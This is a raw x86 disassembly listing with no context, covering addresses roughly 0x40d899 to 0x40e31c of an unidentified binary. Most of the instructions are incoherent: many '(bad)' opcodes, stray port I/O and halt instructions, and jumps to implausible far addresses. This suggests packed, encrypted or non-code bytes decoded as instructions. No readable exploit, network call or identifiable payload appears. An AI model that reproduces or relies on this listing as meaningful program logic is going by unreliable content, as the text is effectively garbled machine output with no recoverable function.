  40d899:	add    esi,DWORD PTR [edx+0x45986a4d]
  40d89f:	pop    ebx
  40d8a0:	fld    QWORD PTR [edi]
  40d8a2:	mov    ebp,0xaa03f937
  40d8a7:	popa   
  40d8a8:	push   0xffffff98
  40d8aa:	sub    eax,0x650cb45b
  40d8af:	fwait
  40d8b0:	xchg   ecx,eax
  40d8b1:	mov    dh,0x6b
  40d8b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8b4:	sub    dh,bl
  40d8b6:	add    ebp,esp
  40d8b8:	stos   DWORD PTR es:[edi],eax
  40d8b9:	pop    es
  40d8ba:	mov    ebp,0x7382e5ba
  40d8bf:	addr16 jmp 0x29a71654
  40d8c5:	(bad)  
  40d8c6:	xchg   BYTE PTR ss:[ecx],ch
  40d8c9:	mov    edx,0x41301978
  40d8ce:	cs pop ebx
  40d8d0:	(bad)  
  40d8d1:	shr    BYTE PTR ds:0xbcfe08de,0x37
  40d8d8:	std    
  40d8d9:	add    esi,DWORD PTR [edx]
  40d8db:	pop    edi
  40d8dc:	repnz inc ebx
  40d8de:	sub    ah,BYTE PTR [edx+eax*1+0x44]
  40d8e2:	add    eax,0x7c4b2f1a
  40d8e7:	dec    edx
  40d8e8:	jmp    0x40d9d5
	...
  40d911:	add    BYTE PTR [eax],al
  40d913:	add    BYTE PTR [ecx+edi*4+0x33],dh
  40d917:	or     cl,al
  40d919:	pop    ds
  40d91a:	test   eax,0xe19b0381
  40d91f:	adc    al,0xb
  40d921:	fwait
  40d922:	nop
  40d923:	call   0x1fc7:0x189db9d0
  40d92a:	lods   eax,DWORD PTR ds:[esi]
  40d92b:	mov    ebx,ebp
  40d92d:	sahf   
  40d92e:	dec    esi
  40d92f:	leave  
  40d930:	add    bl,BYTE PTR [ecx+ebp*8]
  40d933:	pop    edx
  40d934:	inc    ebp
  40d935:	pop    ebx
  40d936:	jmp    0x3f263e
  40d93b:	popa   
  40d93c:	mov    ecx,0x361c8b61
  40d941:	scas   al,BYTE PTR es:[edi]
  40d942:	mov    ds:0x4fc8f974,eax
  40d947:	pop    esi
  40d948:	sar    eax,0xfe
  40d94b:	fsubr  QWORD PTR [ecx-0x3d]
  40d94e:	jbe    0x40d8d8
  40d950:	dec    ebx
  40d951:	mov    eax,0xc359bcfe
  40d956:	xor    BYTE PTR [esi+0x2b],dl
  40d959:	mov    eax,0xe841bcfe
  40d95e:	inc    esp
  40d95f:	sub    DWORD PTR [edi+0x5302c01e],edi
  40d965:	rcl    BYTE PTR cs:[ecx],0x0
  40d969:	sar    dh,cl
  40d96b:	push   ss
  40d96c:	mov    ch,0x1e
  40d96e:	les    ecx,FWORD PTR ds:0x74c41eb5
  40d974:	leave  
  40d975:	enter  0x7c8a,0x0
	...
  40d9a1:	add    BYTE PTR [ecx],dl
  40d9a3:	repnz (bad)
  40d9a6:	cmp    eax,0x6845f35b
  40d9ab:	and    al,0x5d
  40d9ad:	sub    BYTE PTR [edx-0xe],al
  40d9b0:	or     ch,cl
  40d9b2:	cmp    eax,0xb68df35b
  40d9b7:	or     BYTE PTR cs:[edx+0x78],ah
  40d9bb:	fs repz (bad) 
  40d9be:	rcr    BYTE PTR [esi],0xe0
  40d9c1:	sbb    DWORD PTR [ebx],ebp
  40d9c3:	shl    BYTE PTR cs:[esi+0x7e79cb8],0x1d
  40d9cb:	mov    eax,0x9cc8a6fe
  40d9d0:	out    0x89,eax
  40d9d2:	jecxz  0x40d98b
  40d9d4:	(bad)  
  40d9d5:	xchg   ebp,eax
  40d9d6:	shr    BYTE PTR [esi],0xf0
  40d9d9:	pop    esp
  40d9da:	enter  0xb8a0,0x0
  40d9de:	ja     0x40da3c
  40d9e0:	add    BYTE PTR [eax],al
  40d9e2:	aam    0x17
  40d9e4:	lea    esi,[ebp-0x49]
  40d9e7:	adc    eax,0x5c570008
  40d9ec:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9ee:	or     eax,0x6f458d5d
  40d9f3:	in     al,dx
  40d9f4:	out    0x68,al
  40d9f6:	mov    ch,0x5b
  40d9f8:	add    BYTE PTR [ebx+0x7d89ac0a],cl
  40d9fe:	sti    
  40d9ff:	sbb    al,0xef
  40da01:	add    ecx,DWORD PTR [edi+ecx*2]
  40da04:	je     0x40da6d
	...
  40da2e:	add    BYTE PTR [eax],al
  40da30:	jl     0x40da91
  40da32:	lea    eax,[ebp+0x7f]
  40da35:	in     al,dx
  40da36:	push   esp
  40da37:	push   esi
  40da38:	dec    edi
  40da39:	push   ebp
  40da3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da3b:	add    bh,ah
  40da3d:	fcmovb st,st(5)
  40da3f:	or     BYTE PTR [eax-0x1d8a009e],ah
  40da45:	pop    ebx
  40da46:	mov    dh,0x46
  40da48:	inc    eax
  40da49:	fcomi  st,st(7)
  40da4b:	or     BYTE PTR [eax+0x5a],cl
  40da4e:	sub    esi,eax
  40da50:	cld    
  40da51:	call   0x302ab64
  40da56:	jmp    FWORD PTR [ecx-0x59]
  40da59:	aad    0xfe
  40da5b:	imul   esp,DWORD PTR [edi-0x588a020f],0x9769fed5
  40da65:	push   ebx
  40da66:	mov    esi,0xb5ba781
  40da6b:	ror    BYTE PTR [ebx-0x6a],0x4e
  40da6f:	push   eax
  40da70:	jg     0x40da52
  40da72:	xchg   ebp,eax
  40da73:	call   eax
  40da75:	aaa    
  40da76:	fcomp  DWORD PTR [ecx+0x4d]
  40da79:	pop    edi
  40da7a:	push   0x0
  40da7c:	ss lock push esp
  40da7f:	(bad)  
  40da80:	ds push edi
  40da82:	hlt    
  40da83:	imul   edi,DWORD PTR [esi],0xbbe8045c
  40da89:	inc    edx
  40da8a:	add    al,0x0
  40da8c:	inc    ebp
  40da8d:	add    bl,BYTE PTR [ecx-0x412612f9]
  40da93:	xchg   ebp,eax
	...
  40dabc:	add    BYTE PTR [eax],al
  40dabe:	inc    ecx
  40dabf:	dec    eax
  40dac0:	(bad)  
  40dac2:	lds    eax,FWORD PTR [ecx+0x6b905eaf]
  40dac8:	inc    esi
  40dac9:	adc    BYTE PTR [esi],bh
  40dacb:	idiv   DWORD PTR [ebp-0x14]
  40dace:	mov    ebp,0x6d571480
  40dad3:	dec    ecx
  40dad4:	das    
  40dad5:	dec    DWORD PTR [ebx+0x367511c8]
  40dadb:	sbb    al,0x3b
  40dadd:	nop
  40dade:	add    DWORD PTR [esi-0x538c014c],eax
  40dae4:	sbb    cl,BYTE PTR [esp+ecx*8-0x1974ecab]
  40daeb:	in     al,dx
  40daec:	add    eax,0x988435f8
  40daf1:	inc    esi
  40daf2:	retf   
  40daf3:	pop    es
  40daf4:	pop    ss
  40daf5:	push   eax
  40daf6:	shr    DWORD PTR [edi],1
  40daf8:	(bad)  
  40daf9:	(bad)  
  40dafa:	push   ebx
  40dafb:	mov    esp,0xc5c3ab1a
  40db00:	adc    DWORD PTR [ecx+0x457fc003],ecx
  40db06:	scas   al,BYTE PTR es:[edi]
  40db07:	je     0x40db1c
  40db09:	jne    0x40db45
  40db0b:	lea    edx,[edi+0x102b9607]
  40db11:	call   FWORD PTR [ecx-0x6e0837d5]
  40db17:	outs   dx,DWORD PTR ds:[esi]
  40db18:	adc    al,0xff
  40db1a:	adc    ebp,esp
  40db1c:	adc    DWORD PTR [ebp-0x76],esi
  40db1f:	add    eax,0xfb98
	...
  40db4c:	pop    bx
  40db4e:	clc    
  40db4f:	adc    DWORD PTR [ecx-0x4a],esi
  40db52:	jno    0x40db7f
  40db54:	imul   esi,DWORD PTR [eax],0xd0841b95
  40db5a:	lea    edx,[edx]
  40db5c:	pop    ecx
  40db5d:	xor    BYTE PTR [ecx+0x7dd06c1b],al
  40db63:	adc    dl,ah
  40db65:	pop    edx
  40db66:	push   ds
  40db67:	adc    ecx,ebx
  40db69:	bound  eax,QWORD PTR [ecx+0x65b5ca9d]
  40db6f:	jle    0x40db6e
  40db71:	adc    DWORD PTR [esi-0x169d03c4],edi
  40db77:	mov    eax,0x9069c6b4
  40db7c:	inc    ebp
  40db7d:	pop    ebp
  40db7e:	mov    ebx,0xd93010e4
  40db83:	adc    dl,BYTE PTR [ebx-0x4e45be9d]
  40db89:	mov    ch,0x2d
  40db8b:	adc    dh,BYTE PTR [ebx+0x4b]
  40db8e:	es cwde 
  40db90:	cmp    ebx,eax
  40db92:	dec    ebp
  40db93:	adc    cl,ch
  40db95:	mov    ch,0x15
  40db97:	cwde   
  40db98:	xor    DWORD PTR [esi-0x11e046d],esi
  40db9e:	add    edx,DWORD PTR [edx]
  40dba0:	shl    DWORD PTR [ebp+0x2fc8f373],1
  40dba6:	loope  0x40dbc3
  40dba8:	je     0x40db60
  40dbaa:	in     eax,dx
  40dbab:	adc    ebp,eax
  40dbad:	paddw  mm7,QWORD PTR [edx+0x0]
	...
  40dbd9:	add    BYTE PTR [esi+esi*4],bh
  40dbdc:	push   ebx
  40dbdd:	hlt    
  40dbde:	test   al,0x2f
  40dbe0:	loope  0x40dbfd
  40dbe2:	mov    bh,0xb7
  40dbe4:	int    0x11
  40dbe6:	mov    ebp,0x804f537
  40dbeb:	dec    ebp
  40dbec:	mov    esi,0xffb63997
  40dbf1:	cmp    eax,DWORD PTR [edx+0x4fac77bd]
  40dbf7:	mov    dh,0xfe
  40dbf9:	sbb    al,0x6a
  40dbfb:	mov    ah,0x74
  40dbfd:	icebp  
  40dbfe:	inc    ebp
  40dbff:	dec    eax
  40dc00:	std    
  40dc01:	xchg   esi,eax
  40dc02:	dec    edi
  40dc03:	mov    dh,0x74
  40dc05:	stc    
  40dc06:	mov    ebx,0x55fcff4d
  40dc0b:	mov    ebp,0xb62f5980
  40dc10:	(bad)  
  40dc11:	cld    
  40dc12:	dec    ebp
  40dc13:	mov    ah,0x74
  40dc15:	loope  0x40dc6c
  40dc17:	test   eax,0xa24f668e
  40dc1c:	sar    ecx,0x3d
  40dc1f:	push   cs
  40dc20:	mov    eax,DWORD PTR [ebp+0x4f]
  40dc23:	cs or  al,0xc3
  40dc26:	cmp    al,0xb4
  40dc28:	je     0x40dc1b
  40dc2a:	xor    eax,0x2f3e9039
  40dc2f:	mov    ah,0x74
  40dc31:	in     eax,0x2e
  40dc33:	or     BYTE PTR cs:[ecx+0x27],al
  40dc37:	mov    ch,0xfe
  40dc39:	es jae 0x40dc4a
  40dc3c:	adc    BYTE PTR [eax+0x0],dh
	...
  40dc67:	add    BYTE PTR [eax-0x4c],al
  40dc6a:	je     0x40dc51
  40dc6c:	dec    esi
  40dc6d:	or     BYTE PTR cs:[ecx],al
  40dc70:	pop    ss
  40dc71:	mov    ch,0xfe
  40dc73:	push   es
  40dc74:	push   ebx
  40dc75:	push   cs
  40dc76:	adc    al,0x70
  40dc78:	inc    eax
  40dc79:	mov    ah,0x74
  40dc7b:	in     eax,0x2e
  40dc7d:	or     BYTE PTR cs:[ecx],al
  40dc80:	pop    es
  40dc81:	mov    ch,0xfe
  40dc83:	out    0x32,al
  40dc85:	push   cs
  40dc86:	sbb    BYTE PTR [eax+0x43],dh
  40dc89:	mov    ds:0xe3dfdc1,al
  40dc8e:	mov    edi,DWORD PTR [ebp+0xeb9fc2]
  40dc94:	xor    edx,esi
  40dc96:	std    
  40dc97:	jne    0x40dd0c
  40dc99:	(bad)  
  40dc9a:	(bad)  
  40dc9b:	inc    BYTE PTR [edx-0x49]
  40dc9e:	out    0x19,al
  40dca0:	pop    ss
  40dca1:	dec    ebx
  40dca2:	(bad)  
  40dca3:	call   DWORD PTR [edx-0x4d]
  40dca6:	std    
  40dca7:	jne    0x40dd18
  40dca9:	push   eax
  40dcaa:	mov    cl,BYTE PTR [edi-0xf74b438]
  40dcb0:	mov    esi,0x67ffffa7
  40dcb5:	aaa    
  40dcb6:	inc    ebp
  40dcb7:	adc    al,0xd4
  40dcb9:	lahf   
  40dcba:	(bad)  
  40dcbb:	je     0x40dd0f
  40dcbd:	push   ecx
  40dcbe:	add    DWORD PTR ss:[edi],esp
  40dcc1:	pop    eax
  40dcc2:	mov    DWORD PTR [ebp-0x65],0x17000058
  40dcc9:	xor    eax,0xfc45
	...
  40dcf6:	out    0x4a,eax
  40dcf8:	jne    0x40dd0e
  40dcfa:	mov    ch,cl
  40dcfc:	push   cs
  40dcfd:	call   edx
  40dcff:	scas   eax,DWORD PTR es:[edi]
  40dd00:	out    0xf2,al
  40dd02:	dec    ecx
  40dd03:	dec    ebx
  40dd04:	dec    DWORD PTR [ebx-0x38320b1]
  40dd0a:	out    0xcb,eax
  40dd0c:	and    DWORD PTR [eax-0x4f],ebp
  40dd0f:	add    al,0x40
  40dd11:	add    BYTE PTR [eax-0x33],cl
  40dd14:	cli    
  40dd15:	call   0x40b601
  40dd1a:	fcom   QWORD PTR [edi]
  40dd1c:	jne    0x40dd2b
  40dd1e:	scas   eax,DWORD PTR es:[edi]
  40dd1f:	jmp    0x4b181e7f
  40dd24:	jne    0x40dd22
  40dd26:	aas    
  40dd27:	dec    ebx
  40dd28:	add    BYTE PTR [eax],0xa7
  40dd2b:	xor    BYTE PTR [ebp-0x14],al
  40dd2e:	mov    WORD PTR [ebx-0x39],ds
  40dd31:	inc    ebp
  40dd32:	jnp    0x40dd92
  40dd34:	add    BYTE PTR [eax],al
  40dd36:	ds ret 0x7d81
  40dd3a:	stos   BYTE PTR es:[edi],al
  40dd3b:	rcl    DWORD PTR [esi+0x2c32617],0xef
  40dd42:	enter  0x98f4,0xb
  40dd46:	xchg   esi,eax
  40dd47:	mov    ?,WORD PTR [ebx-0x1]
  40dd4a:	jns    0x40dd50
  40dd4c:	cdq    
  40dd4d:	sti    
  40dd4e:	jno    0x40dda6
  40dd50:	add    al,ch
  40dd52:	repnz xor cl,BYTE PTR [edi]
  40dd55:	call   DWORD PTR [edi+0x38]
  40dd58:	add    al,0x0
	...
  40dd82:	add    BYTE PTR [eax],al
  40dd84:	ds cmp ecx,ecx
  40dd87:	adc    edi,DWORD PTR [ebp+0x43750299]
  40dd8d:	retf   
  40dd8e:	test   DWORD PTR [eax],eax
  40dd90:	ds ret 0x4545
  40dd94:	lds    eax,FWORD PTR ss:[edx]
  40dd97:	add    BYTE PTR [esi],bh
  40dd99:	or     ecx,0x2c43ef3
  40dd9f:	add    cl,bh
  40dda1:	call   DWORD PTR [edx]
  40dda3:	add    BYTE PTR [esi],bh
  40dda5:	les    eax,FWORD PTR [edx]
  40dda7:	lea    edi,[ebx+0x74]
  40ddaa:	mov    ah,0x8c
  40ddac:	sub    DWORD PTR [eax-0x4c],0xffffff8c
  40ddb0:	jnp    0x40de1e
  40ddb2:	mov    ah,0xfe
  40ddb4:	jae    0x40dd3e
  40ddb6:	or     eax,0x254c4675
  40ddbb:	(bad)  
  40ddbc:	jmp    0xd2be6112
  40ddc1:	les    edx,FWORD PTR [esi+0xadfbd32]
  40ddc7:	add    BYTE PTR [edx-0x79],cl
  40ddca:	cmp    DWORD PTR [ebp-0x2e],0xbd0597c4
  40ddd1:	daa    
  40ddd2:	adc    eax,DWORD PTR [eax]
  40ddd4:	xor    ah,BYTE PTR [ebx+0x5bb6750d]
  40ddda:	out    0x98,al
  40dddc:	xor    eax,0xa174f9c3
  40dde1:	mov    dl,0xd5
  40dde3:	cwde   
  40dde4:	lea    esi,[edx+0x53]
	...
  40de12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de13:	arpl   WORD PTR [eax+0xe],bx
  40de16:	mov    DWORD PTR [edx+0x28811433],esi
  40de1c:	in     eax,0x1b
  40de1e:	jnp    0x40ddeb
  40de20:	lods   eax,DWORD PTR ds:[esi]
  40de21:	push   cs
  40de22:	jno    0x40de4c
  40de24:	mov    eax,ds:0x9dce5c1b
  40de29:	push   cs
  40de2a:	popa   
  40de2b:	sub    BYTE PTR [ebp-0x72318be5],bl
  40de31:	push   cs
  40de32:	push   ecx
  40de33:	sub    BYTE PTR [ecx+0x1b],bh
  40de36:	ins    BYTE PTR es:[edi],dx
  40de37:	into   
  40de38:	jge    0x40de48
  40de3a:	icebp  
  40de3b:	gs jbe 0x40de3c
  40de3e:	ret    0x6e3f
  40de41:	push   cs
  40de42:	xor    esi,ebx
  40de44:	jecxz  0x40de65
  40de46:	ds daa 
  40de48:	call   FWORD PTR [ecx-0x244edf]
  40de4e:	and    DWORD PTR [ebp+0x79],eax
  40de51:	push   cs
  40de52:	adc    DWORD PTR [ebp-0x17],eax
  40de55:	push   cs
  40de56:	xchg   ebx,eax
  40de57:	pop    edi
  40de58:	push   ecx
  40de59:	mov    ds:0x9935b1b1,eax
  40de5e:	stc    
  40de5f:	mov    al,0xb3
  40de61:	(bad)  
  40de62:	(bad)  [eax]
  40de64:	jns    0x40de74
  40de66:	jmp    0xd650721c
  40de6b:	iret   
  40de6c:	jns    0x40de7c
  40de6e:	fldenv [eax]
  40de70:	loop   0x40de87
  40de72:	inc    ecx
  40de73:	fadd   DWORD PTR [ebx+0xd]
	...
  40de9e:	add    BYTE PTR [eax],al
  40dea0:	leave  
  40dea1:	mov    cl,0x9d
  40dea3:	lods   eax,DWORD PTR ds:[esi]
  40dea4:	neg    BYTE PTR [edi+edi*8-0x74f7c228]
  40deab:	std    
  40deac:	mov    edi,0x3b3fe396
  40deb1:	sub    BYTE PTR [eax],cl
  40deb3:	rcl    edi,1
  40deb5:	in     al,0xfe
  40deb7:	(bad)  
  40deb8:	adc    eax,0xc16af418
  40debd:	lods   eax,DWORD PTR ds:[esi]
  40debe:	(bad)  
  40dec1:	jmp    0x5b7ec7c6
  40dec6:	pop    esi
  40dec7:	mov    al,ds:0xae0062fc
  40decc:	leave  
  40decd:	pop    ecx
  40dece:	call   0xfef2c7e7
  40ded3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ded4:	jns    0x40de7f
  40ded6:	add    cl,ch
  40ded8:	cmp    eax,0x42248d5b
  40dedd:	or     edi,edi
  40dedf:	cld    
  40dee0:	inc    ebp
  40dee1:	mov    ecx,0xb2336cfc
  40dee6:	mov    BYTE PTR [esi+ecx*2],ch
  40dee9:	fdivr  QWORD PTR [ecx+esi*2+0x3a]
  40deed:	daa    
  40deee:	or     al,0x6a
  40def0:	mov    ecx,0x3bdb01b4
  40def5:	fdivr  QWORD PTR [ebp+edx*2+0x40]
  40def9:	sub    DWORD PTR [edx],ecx
  40defb:	xchg   ecx,eax
  40defc:	cmp    eax,0xdbe9005b
  40df01:	mov    ds:0xf1c1,eax
	...
  40df2e:	cmp    eax,0xb23144de
  40df33:	mov    cl,0x74
  40df35:	loope  0x40df8c
  40df37:	lea    ecx,[esi+eiz*1+0x217cdc3b]
  40df3e:	cmp    ah,BYTE PTR [edi]
  40df40:	add    al,0xe2
  40df42:	jge    0x40df6b
  40df44:	or     dl,BYTE PTR [ecx+0x3d]
  40df47:	pop    ebx
  40df48:	add    BYTE PTR [eax],al
  40df4a:	xlat   BYTE PTR ds:[ebx]
  40df4b:	inc    bh
  40df4d:	ret    0x5ccf
  40df50:	cmp    DWORD PTR [ebp-0x4d],0x59
  40df54:	jb     0x40df75
  40df56:	adc    bl,BYTE PTR [eax-0x40f2af0a]
  40df5c:	std    
  40df5d:	jne    0x40df0e
  40df5f:	push   esp
  40df60:	mov    ?,WORD PTR cs:[eax+0x5f]
  40df64:	lea    eax,[ebp+0x6f]
  40df67:	in     al,dx
  40df68:	std    
  40df69:	jne    0x40defa
  40df6b:	push   esp
  40df6c:	sahf   
  40df6d:	(bad)  
  40df6e:	rcr    BYTE PTR [edi-0x77],0x45
  40df72:	mov    edx,DWORD PTR [ebx+0x1d]
  40df75:	lea    ebx,[edx]
  40df77:	pop    edi
  40df78:	push   eax
  40df79:	dec    DWORD PTR [edx-0x51]
  40df7c:	out    0x8d,al
  40df7e:	rcr    BYTE PTR [esi-0x1],cl
  40df81:	mov    DWORD PTR [edx],ebp
  40df83:	or     DWORD PTR [ebp+0x68ecaf45],0x4
  40df8a:	ror    cl,0x6
  40df8d:	call   0x400de9
	...
  40dfba:	add    BYTE PTR [eax],al
  40dfbc:	mov    ds:0xa050f699,al
  40dfc1:	leave  
  40dfc2:	push   es
  40dfc3:	call   0x40422c
  40dfc8:	xchg   esp,eax
  40dfc9:	loope  0x40dfad
  40dfcb:	add    edx,edi
  40dfcd:	mov    ebp,0xec6f458b
  40dfd2:	std    
  40dfd3:	jne    0x40df58
  40dfd5:	pop    edi
  40dfd6:	jne    0x40dfe4
  40dfd8:	inc    eax
  40dfd9:	leave  
  40dfda:	push   es
  40dfdb:	call   0x4040a1
  40dfe0:	xchg   edx,eax
  40dfe1:	cdq    
  40dfe2:	not    BYTE PTR [eax+0x20]
  40dfe5:	leave  
  40dfe6:	push   es
  40dfe7:	call   0x40425c
  40dfec:	ds inc ebp
  40dfee:	mov    ?,edi
  40dff0:	ds xbegin 0x3031eae
  40dff7:	add    BYTE PTR [eax+0x6b],ah
  40dffa:	inc    ecx
  40dffb:	or     BYTE PTR [esi],bh
  40dffd:	aaa    
  40dffe:	(bad)  
  40dfff:	test   DWORD PTR [esi],0xa9fb94c1
  40e005:	push   cs
  40e006:	clc    
  40e007:	(bad)  
  40e008:	sub    ebp,DWORD PTR [edx-0x77647fe6]
  40e00e:	or     al,BYTE PTR [ebx+0x75038a13]
  40e014:	xor    al,0xda
  40e016:	add    eax,DWORD PTR [eax]
  40e018:	ds ret 0xc8a8
  40e01c:	jl     0x40dfd7
  40e01e:	add    cl,BYTE PTR [ebp+0x0]
	...
  40e048:	add    BYTE PTR [eax],al
  40e04a:	sti    
  40e04b:	jmp    0xaa34df03
  40e050:	sbb    cl,BYTE PTR [esi]
  40e052:	mov    bl,0xd0
  40e054:	or     cl,BYTE PTR [ebx+0xeda4e]
  40e05a:	ds ret 0x7509
  40e05e:	ss retf 0x8e48
  40e062:	inc    ecx
  40e063:	xor    bh,cl
  40e065:	inc    esp
  40e066:	xor    dh,BYTE PTR [eax-0x3ad61701]
  40e06c:	add    al,BYTE PTR [eax]
  40e06e:	mov    ebp,0xac0606b7
  40e073:	pop    eax
  40e074:	jns    0x40e0bb
  40e076:	push   ss
  40e077:	cmc    
  40e078:	or     DWORD PTR [ebp+0x46],esi
  40e07b:	sbb    al,0x27
  40e07d:	mov    WORD PTR [ecx],cs
  40e07f:	push   ss
  40e080:	jns    0x40e0c7
  40e082:	push   es
  40e083:	aad    0x9
  40e085:	jne    0x40e0cd
  40e087:	sbb    al,0xce
  40e089:	stc    
  40e08a:	icebp  
  40e08b:	jge    0x40e106
  40e08d:	inc    ebp
  40e08e:	out    0x5b,al
  40e090:	mov    ecx,0x11636b0a
  40e095:	fcmovbe st,st(7)
  40e097:	scas   al,BYTE PTR es:[edi]
  40e098:	adc    eax,0xb8b37b79
  40e09d:	or     dl,BYTE PTR [ebx+0x63]
  40e0a0:	adc    DWORD PTR [edi],esi
  40e0a2:	lds    ebp,FWORD PTR [esi-0x54fc8303]
  40e0a8:	arpl   cx,ax
  40e0aa:	test   eax,0x90ee0b
	...
  40e0d7:	add    BYTE PTR [ecx-0x3d],al
  40e0da:	lods   al,BYTE PTR ds:[esi]
  40e0db:	push   cs
  40e0dc:	mov    eax,ds:0xa5c06fae
  40e0e1:	loopne 0x40e10e
  40e0e3:	or     al,0xee
  40e0e5:	lods   eax,DWORD PTR ds:[esi]
  40e0e6:	push   ebx
  40e0e7:	cld    
  40e0e8:	mov    eax,ds:0x810ac1e8
  40e0ed:	in     al,0x23
  40e0ef:	sbb    al,0xbd
  40e0f1:	xor    BYTE PTR [ecx+0x6a29ea03],bh
  40e0f7:	mov    BYTE PTR [ebp+0x5b],dl
  40e0fa:	sbb    eax,0x9130bc99
  40e0ff:	add    edx,edx
  40e101:	xor    eax,0x5b49886a
  40e106:	adc    eax,0x2435e1a5
  40e10b:	lds    eax,FWORD PTR [ecx-0x53]
  40e10e:	repz adc esp,DWORD PTR [esi]
  40e111:	sbb    al,0xf7
  40e113:	add    edi,DWORD PTR [esi]
  40e115:	bound  ebp,QWORD PTR [ecx-0x40bcb470]
  40e11b:	test   al,0x7e
  40e11d:	pop    ebx
  40e11e:	pop    esi
  40e11f:	nop
  40e120:	sub    ebx,eax
  40e122:	sbb    BYTE PTR [edx+0x43e1ae11],cl
  40e128:	xchg   ebx,eax
  40e129:	pusha  
  40e12a:	shr    DWORD PTR [ecx+0xae91c62],1
  40e130:	jae    0x40e0dd
  40e132:	inc    DWORD PTR [eax-0x1c]
  40e135:	das    
  40e136:	add    cl,ch
  40e138:	call   0x118552a
	...
  40e165:	add    ch,al
  40e167:	lods   eax,DWORD PTR ds:[esi]
  40e168:	dec    BYTE PTR [esi]
  40e16a:	xchg   DWORD PTR [esi+0x2235e574],ebp
  40e170:	mov    cs,WORD PTR [esi]
  40e172:	xor    al,0xae
  40e174:	je     0x40e16f
  40e176:	aaa    
  40e177:	sub    BYTE PTR [ecx+edx*1],cl
  40e17a:	and    ebx,ebp
  40e17c:	(bad)  
  40e17d:	test   BYTE PTR [edi+0x28],0xec
  40e181:	out    dx,al
  40e182:	mov    ecx,0x247ee861
  40e187:	scas   al,BYTE PTR es:[edi]
  40e188:	(bad)  
  40e189:	fmulp  st(1),st
  40e18b:	mov    ch,0xfe
  40e18d:	pop    esp
  40e18e:	xchg   esi,eax
  40e18f:	mov    ch,0x8b
  40e191:	pop    edi
  40e192:	aaa    
  40e193:	scas   al,BYTE PTR es:[edi]
  40e194:	(bad)  
  40e195:	cmp    al,0x2a
  40e197:	ret    
  40e198:	jo     0x40e1f2
  40e19a:	inc    edi
  40e19b:	scas   al,BYTE PTR es:[edi]
  40e19c:	(bad)  
  40e19d:	cmp    al,0x56
  40e19f:	ret    
  40e1a0:	push   0xfeae3758
  40e1a5:	sbb    al,0x42
  40e1a7:	ret    
  40e1a8:	pusha  
  40e1a9:	js     0x40e1f2
  40e1ab:	scas   al,BYTE PTR es:[edi]
  40e1ac:	dec    ebp
  40e1ad:	push   0xffffffb9
  40e1af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1b0:	call   DWORD PTR [edx+ecx*2]
  40e1b3:	pusha  
  40e1b4:	div    dh
  40e1b6:	shl    BYTE PTR [ebp-0x1fb88103],0x44
  40e1bd:	jno    0x40e1a3
  40e1bf:	mov    ds:0x63de1c1,eax
  40e1c4:	mov    edx,DWORD PTR [ebp-0x45]
  40e1c7:	xchg   edi,eax
  40e1c8:	sti    
  40e1c9:	pop    esi
	...
  40e1f2:	add    BYTE PTR [eax],al
  40e1f4:	leave  
  40e1f5:	pusha  
  40e1f6:	call   0xfeed67f0
  40e1fb:	loop   0x40e27a
  40e1fd:	es das 
  40e1ff:	add    BYTE PTR [edx-0x70af0514],cl
  40e205:	xor    cl,BYTE PTR [eax+0x756228ff]
  40e20b:	cld    
  40e20c:	sbb    ah,bl
  40e20e:	or     ch,al
  40e210:	push   esp
  40e211:	sub    eax,0x18ccffff
  40e216:	je     0x40e227
  40e218:	sub    ah,bl
  40e21a:	push   es
  40e21b:	push   DWORD PTR [edx+0x3a87e854]
  40e221:	(bad)  
  40e222:	dec    DWORD PTR [ebx]
  40e224:	addr16 fdiv st(6),st
  40e227:	(bad)  
  40e228:	xor    dl,BYTE PTR [eax+ebp*8-0x78]
  40e22c:	pop    ds
  40e22d:	(bad)  
  40e22e:	dec    ecx
  40e230:	aad    0xb0
  40e232:	(bad)  
  40e233:	push   esp
  40e234:	or     al,0x44
  40e236:	add    esp,0xffff62b3
  40e23c:	loopne 0x40e26b
  40e23e:	mov    eax,0x6378fe
  40e243:	add    BYTE PTR [edi+0x58],ah
  40e246:	mov    eax,DWORD PTR [ebp+0x5b]
  40e249:	scas   eax,DWORD PTR es:[edi]
  40e24a:	mov    esi,0x37d86274
  40e24f:	add    BYTE PTR [edx-0x54],al
  40e252:	out    0x51,eax
  40e254:	pop    ax
  40e256:	add    bh,bh
	...
  40e280:	add    BYTE PTR [eax],al
  40e282:	xor    dh,BYTE PTR [ebx+0x62db29e6]
  40e288:	dec    DWORD PTR [ebx]
  40e28a:	xchg   edi,eax
  40e28b:	fisttp QWORD PTR ds:0x3ff2ed68
  40e291:	add    BYTE PTR [eax+0x40e80add],ch
  40e297:	sub    edi,edi
  40e299:	dec    DWORD PTR [ebp+eiz*4-0x6717309a]
  40e2a0:	(bad)  
  40e2a1:	(bad)  
  40e2a2:	ds (bad) 
  40e2a4:	mul    bh
  40e2a6:	data16 es or bh,bh
  40e2aa:	mov    bh,0x3e
  40e2ac:	dec    ebx
  40e2ad:	(bad)  
  40e2ae:	stc    
  40e2af:	ins    BYTE PTR es:[edi],dx
  40e2b0:	fwait
  40e2b1:	cmp    eax,0x8d02c23f
  40e2b6:	ret    
  40e2b7:	jg     0x40e2c2
  40e2b9:	jmp    ecx
  40e2bb:	icebp  
  40e2bc:	sbb    dl,al
  40e2be:	scas   al,BYTE PTR es:[edi]
  40e2bf:	dec    esp
  40e2c0:	or     BYTE PTR [ebp-0xf68045],cl
  40e2c6:	leave  
  40e2c7:	icebp  
  40e2c8:	pop    es
  40e2c9:	mov    ch,0x86
  40e2cb:	push   ebx
  40e2cc:	or     bh,bh
  40e2ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e2cf:	mov    edi,0x3ab1ff86
  40e2d4:	jle    0x40e292
  40e2d6:	test   al,0xbc
  40e2d8:	push   es
  40e2d9:	inc    eax
  40e2da:	xor    DWORD PTR [esi],edi
  40e2dc:	adc    eax,DWORD PTR [eax]
  40e2de:	ds ret 0x9577
  40e2e2:	jl     0x40e267
  40e2e4:	push   es
  40e2e5:	inc    DWORD PTR [eax]
	...
  40e30f:	add    BYTE PTR [ecx-0x7e000d41],dl
  40e315:	ror    DWORD PTR [esi-0x27803484],0x4f
  40e31c:	out    0xfe,al
